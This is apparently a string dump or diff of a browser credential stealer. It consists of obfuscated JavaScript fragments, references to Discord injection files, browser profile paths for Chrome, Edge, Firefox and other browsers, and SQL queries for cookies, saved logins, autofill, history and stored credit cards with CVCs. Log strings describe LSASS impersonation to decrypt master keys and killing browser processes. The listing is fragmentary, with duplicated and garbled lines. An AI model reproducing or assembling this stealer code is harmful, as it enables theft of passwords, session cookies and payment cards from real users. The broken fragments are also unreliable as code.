+,Mwe5hP(Q4Ysb_[0x6b5]),Mwe5hP(Q4Ysb_[0x6b6]),Mwe5hP(Q4Ysb_[0x6b7]),Mwe5hP(Q4Ysb_[0x6b8]),Mwe5hP(Q4Ysb_[0x6b9]),Mwe5hP(Q4Ysb_[0x6ba]),�
+,Mwe5hP(Q4Ysb_[0x6bb]),Mwe5hP(Q4Ysb_[0x6bc]),Mwe5hP(Q4Ysb_[0x6bd]),\
+,Mwe5hP(Q4Ysb_[0x6bb]),Mwe5hP(Q4Ysb_[0x6bc]),Mwe5hP(Q4Ysb_[0x6bd]),�
+,Mwe5hP(Q4Ysb_[0x6be]),Mwe5hP(Q4Ysb_[0x6bf]),Mwe5hP(Q4Ysb_[0x6c0]),\
+,Mwe5hP(Q4Ysb_[0x6be]),Mwe5hP(Q4Ysb_[0x6bf]),Mwe5hP(Q4Ysb_[0x6c0]),�
+,Mwe5hP(Q4Ysb_[0x6c1]),Mwe5hP(Q4Ysb_[0x6c2]),Mwe5hP(Q4Ysb_[0x6c3]),Mwe5hP(Q4Ysb_[0x6c4]),Mwe5hP(Q4Ysb_[0x6c5]),Mwe5hP(Q4Ysb_[0x6c6]),\
+,Mwe5hP(Q4Ysb_[0x6c1]),Mwe5hP(Q4Ysb_[0x6c2]),Mwe5hP(Q4Ysb_[0x6c3]),Mwe5hP(Q4Ysb_[0x6c4]),Mwe5hP(Q4Ysb_[0x6c5]),Mwe5hP(Q4Ysb_[0x6c6]),�
+,Mwe5hP(Q4Ysb_[0x700]),Mwe5hP(Q4Ysb_[0x701]),Mwe5hP(Q4Ysb_[0x702]),Mwe5hP(Q4Ysb_[0x703]),Mwe5hP(Q4Ysb_[0x704]),Mwe5hP(Q4Ysb_[0x705]),Mwe5hP(Q4Ysb_[0x706]),\
+,Mwe5hP(Q4Ysb_[0x700]),Mwe5hP(Q4Ysb_[0x701]),Mwe5hP(Q4Ysb_[0x702]),Mwe5hP(Q4Ysb_[0x703]),Mwe5hP(Q4Ysb_[0x704]),Mwe5hP(Q4Ysb_[0x705]),Mwe5hP(Q4Ysb_[0x706]),�
+,Mwe5hP(Q4Ysb_[0x707]),Mwe5hP(Q4Ysb_[0x708]),Mwe5hP(Q4Ysb_[0x709]),Mwe5hP(Q4Ysb_[0x70a]),Mwe5hP(Q4Ysb_[0x70b]),Mwe5hP(Q4Ysb_[0x70c]),\
+,Mwe5hP(Q4Ysb_[0x707]),Mwe5hP(Q4Ysb_[0x708]),Mwe5hP(Q4Ysb_[0x709]),Mwe5hP(Q4Ysb_[0x70a]),Mwe5hP(Q4Ysb_[0x70b]),Mwe5hP(Q4Ysb_[0x70c]),�
+,Mwe5hP(Q4Ysb_[0x70d]),Mwe5hP(Q4Ysb_[0x710]),Mwe5hP(Q4Ysb_[0x711]),Mwe5hP(Q4Ysb_[0x712]),\
+,Mwe5hP(Q4Ysb_[0x70d]),Mwe5hP(Q4Ysb_[0x710]),Mwe5hP(Q4Ysb_[0x711]),Mwe5hP(Q4Ysb_[0x712]),�
+,Mwe5hP(Q4Ysb_[0x713]),Mwe5hP(Q4Ysb_[0x714]),Mwe5hP(Q4Ysb_[0x715]),Mwe5hP(Q4Ysb_[0x716]),Mwe5hP(Q4Ysb_[0x717]),Mwe5hP(Q4Ysb_[0x718]),\
+,Mwe5hP(Q4Ysb_[0x713]),Mwe5hP(Q4Ysb_[0x714]),Mwe5hP(Q4Ysb_[0x715]),Mwe5hP(Q4Ysb_[0x716]),Mwe5hP(Q4Ysb_[0x717]),Mwe5hP(Q4Ysb_[0x718]),�
+,Mwe5hP(Q4Ysb_[0x719]),Mwe5hP(Q4Ysb_[0x71a]),Mwe5hP(Q4Ysb_[0x71b]),\
+,Mwe5hP(Q4Ysb_[0x719]),Mwe5hP(Q4Ysb_[0x71a]),Mwe5hP(Q4Ysb_[0x71b]),�
+,Mwe5hP(Q4Ysb_[0x768]),Mwe5hP(Q4Ysb_[0x769]),\
+,Mwe5hP(Q4Ysb_[0x768]),Mwe5hP(Q4Ysb_[0x769]),�
+,Mwe5hP(Q4Ysb_[0x76a]),\
+,Mwe5hP(Q4Ysb_[0x76a]),�
+,Mwe5hP(Q4Ysb_[0x76c]),Mwe5hP(Q4Ysb_[0x76d]),\
+,Mwe5hP(Q4Ysb_[0x76c]),Mwe5hP(Q4Ysb_[0x76d]),�
+,Mwe5hP(Q4Ysb_[0x76e]),Mwe5hP(Q4Ysb_[0x76f]),\
+,Mwe5hP(Q4Ysb_[0x76e]),Mwe5hP(Q4Ysb_[0x76f]),�
+,Mwe5hP(Q4Ysb_[0x770]),Mwe5hP(Q4Ysb_[0x771]),Mwe5hP(Q4Ysb_[0x772]),\
+,Mwe5hP(Q4Ysb_[0x770]),Mwe5hP(Q4Ysb_[0x771]),Mwe5hP(Q4Ysb_[0x772]),�
+,Mwe5hP(Q4Ysb_[0x773]),Mwe5hP(Q4Ysb_[0x774]),Mwe5hP(Q4Ysb_[0x775]),Mwe5hP(Q4Ysb_[0x777]),\
+,Mwe5hP(Q4Ysb_[0x773]),Mwe5hP(Q4Ysb_[0x774]),Mwe5hP(Q4Ysb_[0x775]),Mwe5hP(Q4Ysb_[0x777]),�
+,Mwe5hP(Q4Ysb_[0x778]),Mwe5hP(Q4Ysb_[0x779]),Mwe5hP(Q4Ysb_[0x77a]),Mwe5hP(Q4Ysb_[0x77b]),Mwe5hP(Q4Ysb_[0x77c]),\
+,Mwe5hP(Q4Ysb_[0x778]),Mwe5hP(Q4Ysb_[0x779]),Mwe5hP(Q4Ysb_[0x77a]),Mwe5hP(Q4Ysb_[0x77b]),Mwe5hP(Q4Ysb_[0x77c]),�
+,Mwe5hP(Q4Ysb_[0x7bc]),Mwe5hP(Q4Ysb_[0x7bd]),\
+,Mwe5hP(Q4Ysb_[0x7bc]),Mwe5hP(Q4Ysb_[0x7bd]),�
+,Mwe5hP(Q4Ysb_[0x803]),\
+,Mwe5hP(Q4Ysb_[0x803]),�
+,Mwe5hP(Q4Ysb_[0x804]),Mwe5hP(Q4Ysb_[0x805]),\
+,Mwe5hP(Q4Ysb_[0x804]),Mwe5hP(Q4Ysb_[0x805]),�
+,Mwe5hP(Q4Ysb_[0x806]),\
+,Mwe5hP(Q4Ysb_[0x806]),�
+,Mwe5hP(Q4Ysb_[0x807]),\
+,Mwe5hP(Q4Ysb_[0x807]),�
+,Mwe5hP(Q4Ysb_[0xa]),\
+,Mwe5hP(Q4Ysb_[0xa]),�
+,Mwe5hP(Q4Ysb_[0xc]),\
+,Mwe5hP(Q4Ysb_[0xc]),�
+,Mwe5hP(Q4Ysb_[0xcf]),Mwe5hP(Q4Ysb_[0x2b]),\
+,Mwe5hP(Q4Ysb_[0xcf]),Mwe5hP(Q4Ysb_[0x2b]),�
+,Mwe5hP(Q4Ysb_[0xd4]),\
+,Mwe5hP(Q4Ysb_[0xd4]),�
+,Mwe5hP(Q4Ysb_[0xdd]),Mwe5hP(0x15),\
+,Mwe5hP(Q4Ysb_[0xdd]),Mwe5hP(0x15),�
+,Mwe5hP[Q4Ysb_[0x7]]=\
+,Mwe5hP[Q4Ysb_[0x7]]=�
+,QBgnkq.LQnv57P[Q4Ysb_[ZmaojfE+-0x44]]=\
+,QBgnkq.LQnv57P[Q4Ysb_[ZmaojfE+-0x44]]=�
+,Qtd1pJb=\
+,Qtd1pJb=�
+,UGn3r8[Q4Ysb_[0x1e]]=\
+,UGn3r8[Q4Ysb_[0x1e]]=�
+,UGn3r8[Q4Ysb_[0x3d]]=\
+,UGn3r8[Q4Ysb_[0x3d]]=�
+,Wi3TN_.dIdueN=\
+,Wi3TN_.dIdueN=�
+,XTIIhOp.ZGh2Ki=\
+,XTIIhOp.ZGh2Ki=�
+,ZmaojfE.IkD1UU=ZmaojfE.nr_8hiW,ciepIgo+=-0x8d,qric7jd+=0xf1,R01Xodj+=0x9a,TV9xde+=0x87);break;default:Ina5dMA(ygU356.gcjlDiC[Q4Ysb_[0x0]]=Q4Ysb_[0x1],ygU356.gcjlDiC[Q4Ysb_[0x1]]=\
+,ZmaojfE.IkD1UU=ZmaojfE.nr_8hiW,ciepIgo+=-0x8d,qric7jd+=0xf1,R01Xodj+=0x9a,TV9xde+=0x87);break;default:Ina5dMA(ygU356.gcjlDiC[Q4Ysb_[0x0]]=Q4Ysb_[0x1],ygU356.gcjlDiC[Q4Ysb_[0x1]]=�
+,ZmaojfE[Q4Ysb_[0x7]]=\
+,ZmaojfE[Q4Ysb_[0x7]]=�
+,bqPvMy.JlrqTAW=\
+,bqPvMy.JlrqTAW=�
+,cfNHIqy.JLeqrM8[Q4Ysb_[0x7]]=\
+,cfNHIqy.JLeqrM8[Q4Ysb_[0x7]]=�
+,ciepIgo.pUR_sK=ciepIgo.pjryzOD,UGn3r8+=0x17e,ZmaojfE+=-0xd8,JNlQeG+=0x2c);break;case 0x58:case 0x3c:Ina5dMA(wGaInM.djgXIt[Q4Ysb_[ZmaojfE+0x25a]]=\
+,ciepIgo.pUR_sK=ciepIgo.pjryzOD,UGn3r8+=0x17e,ZmaojfE+=-0xd8,JNlQeG+=0x2c);break;case 0x58:case 0x3c:Ina5dMA(wGaInM.djgXIt[Q4Ysb_[ZmaojfE+0x25a]]=�
+,ciepIgo[-Q4Ysb_[0x2b]]=\
+,ciepIgo[-Q4Ysb_[0x2b]]=�
+,ciepIgo[Q4Ysb_[0x1e]]=\
+,ciepIgo[Q4Ysb_[0x1e]]=�
+,ciepIgo[Q4Ysb_[0x1f8]]=\
+,ciepIgo[Q4Ysb_[0x1f8]]=�
+,ciepIgo[Q4Ysb_[R01Xodj+0x2e1]]=\
+,ciepIgo[Q4Ysb_[R01Xodj+0x2e1]]=�
+,ciepIgo[Q4Ysb_[ziFfzJn+-0x29]]=\
+,ciepIgo[Q4Ysb_[ziFfzJn+-0x29]]=�
+,fCdbn2r.N7C7Se[-Q4Ysb_[0x31]]=\
+,fCdbn2r.N7C7Se[-Q4Ysb_[0x31]]=�
+,g1mxAQ.dd8khF3=\
+,g1mxAQ.dd8khF3=�
+,hUI9eT.j2igPW[Q4Ysb_[0x7]]=\
+,hUI9eT.j2igPW[Q4Ysb_[0x7]]=�
+,i6Rw67H.lgjGVb[Q4Ysb_[qric7jd+0x48]]=\
+,i6Rw67H.lgjGVb[Q4Ysb_[qric7jd+0x48]]=�
+,iFqYgn.eYSMX7[Q4Ysb_[ziFfzJn+0x6]]=\
+,iFqYgn.eYSMX7[Q4Ysb_[ziFfzJn+0x6]]=�
+,jQG0xxP.FABuml[Q4Ysb_[0x1e]]=\
+,jQG0xxP.FABuml[Q4Ysb_[0x1e]]=�
+,kgWoEx.D4sp7f[Q4Ysb_[UGn3r8+0x25f]]=\
+,kgWoEx.D4sp7f[Q4Ysb_[UGn3r8+0x25f]]=�
+,oXWOQ5q.u537Nm=oXWOQ5q.ypmUU2,ziFfzJn+=-0xe,R01Xodj+=0x4,JNlQeG+=0x5b);break;case 0x70:Ina5dMA(WtV8dxr.wJeVyM3[-Q4Ysb_[ziFfzJn+0x47]]=\
+,oXWOQ5q.u537Nm=oXWOQ5q.ypmUU2,ziFfzJn+=-0xe,R01Xodj+=0x4,JNlQeG+=0x5b);break;case 0x70:Ina5dMA(WtV8dxr.wJeVyM3[-Q4Ysb_[ziFfzJn+0x47]]=�
+,oXWOQ5q=\
+,oXWOQ5q=�
+,pMbXK_.kmUqGBl=\
+,pMbXK_.kmUqGBl=�
+,pfbvIk.CUjWiB[Q4Ysb_[R01Xodj+0xc1]]=\
+,pfbvIk.CUjWiB[Q4Ysb_[R01Xodj+0xc1]]=�
+,qRcdTi0.WsF3rK4=\
+,qRcdTi0.WsF3rK4=�
+,rgP45O.oQ6YFi=\
+,rgP45O.oQ6YFi=�
+,rvwt1S.ko68n0[Q4Ysb_[0x1e]]=\
+,rvwt1S.ko68n0[Q4Ysb_[0x1e]]=�
+,vGQbSb8.l93Cdbw[Q4Ysb_[0x7]]=\
+,vGQbSb8.l93Cdbw[Q4Ysb_[0x7]]=�
+,vPkyaI=\
+,vPkyaI=�
+,wmBuGW1.UST2B0[Q4Ysb_[0x7]]=\
+,wmBuGW1.UST2B0[Q4Ysb_[0x7]]=�
+,x70NlrI.W0M7Wh[Q4Ysb_[qric7jd+0x100]]=\
+,x70NlrI.W0M7Wh[Q4Ysb_[qric7jd+0x100]]=�
+,y5ZNgn4.MC7QOhW+=\
+,y5ZNgn4.MC7QOhW+=�
+,yhIoEt.SxAWenu[-Q4Ysb_[qric7jd+0x23d]]=\
+,yhIoEt.SxAWenu[-Q4Ysb_[qric7jd+0x23d]]=�
+,zMTPE5W[-Q4Ysb_[R01Xodj+0x51]]=\
+,zMTPE5W[-Q4Ysb_[R01Xodj+0x51]]=�
+,zMTPE5W[Q4Ysb_[0x1]]=zR_3mo.decompressFromUTF16(zMTPE5W[Q4Ysb_[0x3]]),zMTPE5W[Q4Ysb_[0x7]]=zMTPE5W[Q4Ysb_[0x1]].split(\
+,zMTPE5W[Q4Ysb_[0x1]]=zR_3mo.decompressFromUTF16(zMTPE5W[Q4Ysb_[0x3]]),zMTPE5W[Q4Ysb_[0x7]]=zMTPE5W[Q4Ysb_[0x1]].split(�
+,zMTPE5W[Q4Ysb_[0x1]]=zR_3mo.decompressFromUTF16(zMTPE5W[Q4Ysb_[R01Xodj+0x17f]]),zMTPE5W[Q4Ysb_[R01Xodj+0x183]]=zMTPE5W[Q4Ysb_[0x1]].split(\
+,zMTPE5W[Q4Ysb_[0x1]]=zR_3mo.decompressFromUTF16(zMTPE5W[Q4Ysb_[R01Xodj+0x17f]]),zMTPE5W[Q4Ysb_[R01Xodj+0x183]]=zMTPE5W[Q4Ysb_[0x1]].split(�
+,ziFfzJn,R01Xodj,JNlQeG,oXWOQ5q,UGn3r8,ZmaojfE,VEEQ4dy;Ina5dMA(ziFfzJn=\
+,ziFfzJn,R01Xodj,JNlQeG,oXWOQ5q,UGn3r8,ZmaojfE,VEEQ4dy;Ina5dMA(ziFfzJn=�
+,ziFfzJn,R01Xodj,UGn3r8,ZmaojfE,VEEQ4dy,JNlQeG,oXWOQ5q;Ina5dMA(ziFfzJn=\
+,ziFfzJn,R01Xodj,UGn3r8,ZmaojfE,VEEQ4dy,JNlQeG,oXWOQ5q;Ina5dMA(ziFfzJn=�
+,ziFfzJn[-Q4Ysb_[0x41]]=\
+,ziFfzJn[-Q4Ysb_[0x41]]=�
+,ziFfzJn[-Q4Ysb_[0x47]]=\
+,ziFfzJn[-Q4Ysb_[0x47]]=�
+,ziFfzJn[Q4Ysb_[0x1e]]=\
+,ziFfzJn[Q4Ysb_[0x1e]]=�
+,ziFfzJn[Q4Ysb_[0x7]]=\
+,ziFfzJn[Q4Ysb_[0x7]]=�
+,ziFfzJn[Q4Ysb_[0xe6]]=\
+,ziFfzJn[Q4Ysb_[0xe6]]=�
+,ziFfzJn[Q4Ysb_[JNlQeG+-0x40]]=\
+,ziFfzJn[Q4Ysb_[JNlQeG+-0x40]]=�
+./discord.js\
+./discord.js�
+./inj.js\
+./inj.js�
+/IM\
+/IM�
+1st NCryptDecrypt failed: {status}\
+1st NCryptDecrypt failed: {status}�
+2nd NCryptDecrypt failed: {status}\
+2nd NCryptDecrypt failed: {status}�
+360 Secure
+360 Securekey1
+360 Speed
+360 Speedkey1
+360chrome.exe
+360secure
+360speed
+: {\n        
+:\n                    name = node.get(\
+:\n                process_chromium_browser(browser_name, browser_config)\n            elif browser_config[
+:\n                process_gecko_browser(browser_name, browser_config)\n        except Exception as e:\n            logger.error(f\
+:\n    if not is_admin():\n        logger.warning(\
+;var zMTPE5W,vPkyaI,ZmaojfE,VEEQ4dy={},xOlYoR={},JNlQeG=\
+;var zMTPE5W,vPkyaI,ZmaojfE,VEEQ4dy={},xOlYoR={},JNlQeG=�
+<decryption_failed: {e}>\
+<decryption_failed: {e}>�
+<decryption_failed\
+<decryption_failed�
+================\\nGUID: {guid}\\nNAME: {name}\\nNUMBER: {decrypted_num}\\nVALID: {exp_m}/{exp_y}\\nCVC: {cvc}\\nTYPE: Local Card\
+================\\nID: {card_id}\\nNAME: {name}\\nNUMBER: {decrypted_num}\\nVALID: {exp_m}/{exp_y}\\nCVC: {cvc}\\nTYPE: Masked/Server Card\
+================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Local Card�
+================\nID: {card_id}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Masked/Server Card�
+==Mwe5hP[Q4Ysb_[0x2]]?Q4Ysb_[0x5]:(Mwe5hP[Q4Ysb_[0x2]]=Mwe5hP[Q4Ysb_[0x2]].replace(/ /g,\
+==Mwe5hP[Q4Ysb_[0x2]]?Q4Ysb_[0x5]:(Mwe5hP[Q4Ysb_[0x2]]=Mwe5hP[Q4Ysb_[0x2]].replace(/ /g,�
+@primno/dpapi\
+@primno/dpapi�
+Admin check result: {result}\
+Admin check result: {result}�
+AppData\Local\BraveSoftware\Brave-Browser\User Data
+AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
+AppData\Local\Chromium\User Data
+AppData\Local\Chromium\User Data\Local State
+AppData\Local\Google\Chrome Beta\User Data
+AppData\Local\Google\Chrome Beta\User Data\Local State
+AppData\Local\Google\Chrome\User Data
+AppData\Local\Google\Chrome\User Data\Local State
+AppData\Local\Microsoft\Edge\User Data
+AppData\Local\Microsoft\Edge\User Data\Local State
+AppData\Local\Vivaldi\User Data
+AppData\Local\Vivaldi\User Data\Local State
+AppData\Local\Yandex\YandexBrowser\User Data
+AppData\Local\Yandex\YandexBrowser\User Data\Local State
+AppData\Roaming\Mozilla\Firefox\Profiles
+AppData\Roaming\Opera Software\Opera GX Stable
+AppData\Roaming\Opera Software\Opera GX Stable\Local State
+AppData\Roaming\Opera Software\Opera Stable
+AppData\Roaming\Opera Software\Opera Stable\Local State
+AppData\\Local\\360Chrome\\Chrome\\User Data
+AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State
+AppData\\Local\\Chromium\\User Data
+AppData\\Local\\Chromium\\User Data\\Local State
+AppData\\Local\\CocCoc\\Browser\\User Data
+AppData\\Local\\CocCoc\\Browser\\User Data\\Local State
+AppData\\Local\\Google\\Chrome Beta\\User Data
+AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State
+AppData\\Local\\Google\\Chrome\\User Data
+AppData\\Local\\Google\\Chrome\\User Data\\Local State
+AppData\\Local\\Microsoft\\Edge\\User Data
+AppData\\Local\\Microsoft\\Edge\\User Data\\Local State
+AppData\\Local\\Tencent\\QQBrowser\\User Data
+AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State
+AppData\\Local\\Vivaldi\\User Data
+AppData\\Local\\Vivaldi\\User Data\\Local State
+AppData\\Local\\Yandex\\YandexBrowser\\User Data
+AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State
+AppData\\Roaming\\Mozilla\\Firefox\\Profiles
+AppData\\Roaming\\Opera Software\\Opera GX Stable
+AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State
+AppData\\Roaming\\Opera Software\\Opera Stable
+AppData\\Roaming\\Opera Software\\Opera Stable\\Local State
+AppData\\\\Local\\\\360Chrome\\\\Chrome\\\\User Data
+AppData\\\\Local\\\\360Chrome\\\\Chrome\\\\User Data\\\\Local State
+AppData\\\\Local\\\\CocCoc\\\\Browser\\\\User Data
+AppData\\\\Local\\\\CocCoc\\\\Browser\\\\User Data\\\\Local State
+AppData\\\\Local\\\\Tencent\\\\QQBrowser\\\\User Data
+AppData\\\\Local\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Local State
+AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles
+Attempting to impersonate LSASS\
+Attempting to impersonate LSASS�
+Attempting to kill {browser_config[
+BPTXTwr\
+BPTXTwr�
+Bookmarks\
+Bookmarks�
+Brave
+Brave Softwarekey1
+Browser data path not found: {browser_data_path}\
+Browser data path not found: {browser_data_path}�
+Browser-Datas
+C:\Program Files (x86)\Mozilla Firefox\nss3.dll�
+C:\Program Files\Mozilla Firefox\nss3.dll�
+C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll\
+C:\\Program Files\\Mozilla Firefox\\nss3.dll\
+Chromium
+Chromiumkey1
+CocCoc Browser
+CocCoc Browserkey1
+Cookies\
+Cookies�
+Copying DB from {db_path} to {tmp_path}\
+Copying DB from {db_path} to {tmp_path}�
+Could not load NSS library\
+Could not load NSS library�
+Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted\
+Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted�
+DECRYPT_FAILED\
+DECRYPT_FAILED�
+Decrypting system key with LSASS impersonation\
+Decrypting system key with LSASS impersonation�
+Decrypting user key\
+Decrypting user key�
+Default\
+Default�
+Deriving final master key\
+Deriving final master key�
+Deriving v20 master key with flag {parsed_data.get(
+Error checking admin status: {e}\
+Error checking admin status: {e}�
+Error copying SQLite DB: {e}\
+Error copying SQLite DB: {e}�
+Error decrypting with NSS: {e}\
+Error decrypting with NSS: {e}�
+Error extracting bookmarks: {e}\
+Error extracting bookmarks: {e}�
+Error extracting credit cards: {e}\
+Error extracting credit cards: {e}�
+Error extracting gecko autofill: {e}\
+Error extracting gecko autofill: {e}�
+Error extracting gecko bookmarks: {e}\
+Error extracting gecko bookmarks: {e}�
+Error extracting gecko history: {e}\
+Error extracting gecko history: {e}�
+Error extracting history: {e}\
+Error extracting history: {e}�
+Error getting master key: {e}\
+Error getting master key: {e}�
+Error in NSS_Init: {e}\
+Error in NSS_Init: {e}�
+Error killing process: {e}\
+Error killing process: {e}�
+Error processing autofill: {e}\
+Error processing autofill: {e}�
+Error processing local card {guid}: {e}\
+Error processing local card {guid}: {e}�
+Error processing server card {card_id}: {e}\
+Error processing server card {card_id}: {e}�
+Failed to impersonate LSASS: {e}\
+Failed to impersonate LSASS: {e}�
+Failed to load NSS from {path}: {e}\
+Failed to load NSS from {path}: {e}�
+Field: {fieldname}\\nValue: {value}\\nTimes Used: {times}\\n\\n\
+Field: {fieldname}\nValue: {value}\nTimes Used: {times}\n\n�
+Firefox
+Firefox Beta
+Firefox Developer
+Firefox ESR
+Firefox Nightly
+Found encrypted_key\
+Found encrypted_key�
+Found {len(autofills)} autofill entries\
+Found {len(autofills)} autofill entries�
+Found {len(cookies)} cookies\
+Found {len(cookies)} cookies�
+Found {len(profiles)} profiles\
+Found {len(profiles)} profiles�
+GQc24MQ\
+GQc24MQ�
+Getting master key for {browser_config[
+Google Chrome
+Google Chrome Beta
+Google Chrome Betakey1
+Google Chromekey1
+History\
+History�
+Initializing NSS for profile: {profile_path}\
+Initializing NSS for profile: {profile_path}�
+Jb9zeM2
+Loading NSS from {path}\
+Loading NSS from {path}�
+Login Data\
+Login Data�
+Master key retrieved successfully\
+Master key retrieved successfully�
+Microsoft Edge
+Microsoft Edgekey1
+N/A\
+N/A�
+NSS_Init failed with code {ret}\
+NSS_Init failed with code {ret}�
+Network\
+Network�
+No Title\
+No Title�
+No cert DB found in {profile_path}, skipping NSS init\
+No cert DB found in {profile_path}, skipping NSS init�
+No encrypted key found in local state\
+No encrypted key found in local state�
+No webdata DB found\
+No webdata DB found�
+Opera
+Opera GX
+Opera Softwarekey1
+OperationalError querying credit_cards: {e}\
+OperationalError querying credit_cards: {e}�
+OperationalError querying masked_credit_cards: {e}\
+OperationalError querying masked_credit_cards: {e}�
+PATH
+Parsing decrypted key blob\
+Parsing decrypted key blob�
+Parsing key blob of length {len(blob_data)}\
+Parsing key blob of length {len(blob_data)}�
+Processing Chromium browser: {browser_name}\
+Processing Chromium browser: {browser_name}�
+Processing Gecko browser: {browser_name}\
+Processing Gecko browser: {browser_name}�
+Processing browser data\
+Processing browser data�
+Processing cookies from {cookies_db}\
+Processing cookies from {cookies_db}�
+Processing profile: {profile_name}\
+Processing profile: {profile_name}�
+Profile\
+Profile�
+QQ Browser
+QQ Browserkey1
+QQBrowser.exe
+Returning raw key data\
+Returning raw key data�
+Reverted to original token\
+Reverted to original token�
+SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory\
+SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory�
+SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\
+SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards�
+SELECT guid, value_encrypted FROM local_stored_cvc\
+SELECT guid, value_encrypted FROM local_stored_cvc�
+SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies\
+SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies�
+SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;\
+SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;�
+SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards\
+SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards�
+SELECT instrument_id, value_encrypted FROM server_stored_cvc\
+SELECT instrument_id, value_encrypted FROM server_stored_cvc�
+SELECT name, value FROM autofill;\
+SELECT name, value FROM autofill;�
+SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000\
+SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000�
+SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000\
+SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000�
+SeDebugPrivilege\
+SeDebugPrivilege�
+Skipping profile {profile_name} due to NSS init failure\
+Skipping profile {profile_name} due to NSS init failure�
+Starting browser forensics script\
+Starting browser forensics script�
+Successfully impersonated LSASS\
+Successfully impersonated LSASS�
+TEMP
+TRUE\
+TRUE�
+USERPROFILE
+Unknown\
+Unknown�
+Vivaldi
+Vivaldikey1
+Web Data\
+Web Data�
+XERyg6u\
+XERyg6u�
+Y7QL37n\
+Y7QL37n�
+Yandex Browser
+Yandex Browserkey1
+\\u000a\\u000a\
+\\u0020\
+\\u0020\\u0022\
+\\u0020\\u0027\
+\\u0020\\u0028\
+\\u0020\\u0042\
+\\u0020\\u0060\
+\\u0021\
+\\u0021\\u004c\\u0052\\u007d\\u0029\\u0073\\u007c\\u005f\
+\\u0023\
+\\u0024\\u003c\\u007c\\u005e\\u006e\\u004a\\u0079\\u0034\
+\\u0025\\u004e\\u0035\\u0032\\u006b\\u007c\\u0044\\u0068\\u0028\\u0055\
+\\u0026\
+\\u0026\\u0031\
+\\u0027\\u0022\
+\\u0028\
+\\u0028\\u0061\\u0022\\u0029\\u0030\\u0039\\u003e\\u0078\\u003c\\u007c\\u0053\\u0062\\u0022\\u003c\\u0030\\u005b\
+\\u0028\\u006a\\u007c\\u005e\\u0077\\u004a\\u0055\\u0034\
+\\u0029\\u003a\
+\\u002a\\u007e\\u0046\\u0079\\u0074\\u003c\\u007c\
+\\u002b\\u005e\\u002e\\u0028\\u0078\\u005a\\u007c\\u0068\\u0046\\u0035\
+\\u002b\\u005e\\u002e\\u0028\\u0078\\u005a\\u007c\\u0068\\u0046\\u0035\\u0065\\u0065\\u0075\
+\\u002b\\u0071\\u0026\\u007c\\u0031\\u006b\\u0079\\u0063\
+\\u002c\\u003b\\u002f\\u0056\\u0071\\u0052\\u0044\\u0073\\u007c\\u002f\
+\\u002d\\u006d\
+\\u002d\\u0076\
+\\u002e\\u002e\
+\\u0030\
+\\u0031\
+\\u0032\
+\\u0032\\u0055\\u007a\\u0032\\u007c\\u0076\\u0044\\u0034\
+\\u0033\
+\\u0033\\u0037\
+\\u0034\
+\\u0034\\u0035\
+\\u0034\\u003e\
+\\u0034\\u0072\
+\\u0036\
+\\u0036\\u004f\\u006b\\u0032\\u0072\\u0026\\u004b\\u0061\\u0058\\u0031\\u007c\\u0065\\u0076\\u006b\\u0024\
+\\u0036\\u006a\\u002b\\u006e\\u003a\\u005a\\u0051\\u002b\\u0055\\u0049\\u007c\\u007a\\u004a\\u0047\\u002c\\u0036\\u0065\\u0046\\u007a\\u007d\\u0042\\u0061\\u0044\\u0034\
+\\u0037\
+\\u0037\\u0031\\u0060\\u006e\\u0025\\u003e\\u0062\\u0063\\u0048\\u003f\\u004e\\u007c\\u004d\
+\\u0037\\u0060\\u0069\\u004e\\u0033\\u0036\\u007c\\u005f\
+\\u0038\
+\\u0039\\u007c\\u0036\\u0074\\u006c\\u0030\\u005b\\u0061\
+\\u003a\
+\\u003a\\u0020\
+\\u003a\\u0039\\u007a\\u007d\\u0025\\u0076\\u007c\\u005f\
+\\u003c\\u005e\\u004e\\u0062\\u0051\\u0048\\u006e\\u0055\\u0071\\u0066\\u0065\\u0053\\u007c\\u003b\\u0060\\u0047\\u0046\\u0055\\u006c\\u0028\\u003b\
+\\u003d\
+\\u003d\\u003d\
+\\u003d\\u003d\\u003d\
+\\u003f\
+\\u0040\\u007e\\u0070\\u0055\\u0050\\u0039\\u0043\\u007a\\u0033\\u007c\\u0055\\u0072\\u0046\\u0075\
+\\u0041\
+\\u0043\\u005b\\u007c\\u007a\\u005e\\u0078\\u0055\\u0065\
+\\u0043\\u0067\\u0047\\u004e\\u0052\\u004b\\u007c\\u005f\
+\\u0043\\u0067\\u007a\\u007d\\u005a\\u005a\\u007c\\u005f\
+\\u0044\
+\\u0045\\u0031\\u006e\\u007c\\u0073\\u0047\\u0031\\u0036\
